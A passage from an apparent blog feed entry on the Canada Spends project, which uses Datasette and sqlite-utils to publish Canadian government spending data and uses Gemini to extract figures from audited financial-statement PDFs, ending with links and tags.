RCPNT_NML_FR_DESC, CTY_EN_NM, CTY_FR_NM, PROVTER_EN, PROVTER_FR, CNTRY_EN_NM, CNTRY_FR_NM, TOT_CY_XPND_AMT, AGRG_PYMT_AMT  357,797 rows  Download SQLite DB: canada-spends.db 2.4 GB Powered by Datasette · Queries took 24.733ms " style="max-width: 100%;" /&gt;&lt;/p&gt;
&lt;h4 id="processing-pdfs"&gt;Processing PDFs&lt;/h4&gt;
&lt;p&gt;The highest quality government financial data comes from the audited financial statements that every Canadian government department is required to publish. As is so often the case with government data, these are usually published as PDFs.&lt;/p&gt;
&lt;p&gt;Brendan has been using Gemini to help extract data from those PDFs. Since this is accounting data the numbers can be summed and cross-checked to help validate the LLM didn't make any obvious mistakes.&lt;/p&gt;
&lt;h4 id="further-reading"&gt;Further reading&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://datasette.io/"&gt;datasette.io&lt;/a&gt;, the official website for Datasette&lt;/li&gt;
&lt;li&gt;&lt;a href="https://sqlite-utils.datasette.io/"&gt;sqlite-utils.datasette.io&lt;/a&gt; for more on &lt;code&gt;sqlite-utils&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://canadaspends.com/"&gt;Canada Spends&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/BuildCanada/CanadaSpends"&gt;BuildCanada/CanadaSpends&lt;/a&gt; on GitHub&lt;/li&gt;
&lt;/ul&gt;
    
        &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/data-journalism"&gt;data-journalism&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/politics"&gt;politics&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/sqlite"&gt;sqlite&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/youtube"&gt;youtube&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/datasette"&gt;datasette&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/sqlite-utils"&gt;sqlite-utils&lt;/a&gt;&lt;/p&gt;
    

</summary><category term="data-journalism"/><category term="politics"/><category term="sqlite"/><category term="youtube"/><category term="datasette"/><category term="sqlite-utils"/></entry></feed>